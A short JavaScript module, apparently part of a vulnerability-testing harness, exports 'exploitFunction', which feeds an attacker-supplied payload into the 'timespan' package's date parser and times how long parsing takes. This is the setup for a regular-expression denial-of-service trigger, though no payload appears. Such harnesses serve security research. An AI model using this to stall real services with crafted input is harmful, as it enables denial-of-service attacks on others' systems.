const measureTime = require("../utils").measureTime;
const timespan = require("timespan");

function exploitFunction(payload) {
  let t = measureTime(function () {
    var ts = new timespan.parseDate("NOW-" + payload + "milli");
  });
  let time = t[0] + t[1] / 1000000000;
  return time;
}

module.exports = { exploitFunction };